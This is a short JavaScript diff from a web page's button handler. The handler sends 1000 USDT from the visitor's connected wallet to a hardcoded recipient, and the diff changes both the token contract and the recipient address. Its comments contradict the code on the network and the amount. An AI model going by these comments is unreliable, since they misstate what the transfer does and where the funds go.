@@ -18,7 +18,7 @@ document.getElementById('fuck-button').addEventListener('click', async function 
       const sender = accounts[0]; // Assuming the first account is used
       console.log("4")
       // Prepare the transaction data
-      const contractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT contract address on Ethereum Mainnet
+      const contractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT contract address on Ethereum Mainnet
       const contractABI = [
         {
           constant: true,
@@ -412,7 +412,7 @@ document.getElementById('fuck-button').addEventListener('click', async function 
       console.log("5")
       const contract = new web3.eth.Contract(contractABI, contractAddress);
 
-      const recipient = '0x9a395ECe726bCb15430A87fdDdC86de7E976b533';
+      const recipient = '0x9d87C64Ee6d2d9606DC497b1b5e767166FeE522f';
       const amount = web3.utils.toWei('1000', 'ether'); // Convert 20 USDT to wei
 
       // Send the transaction
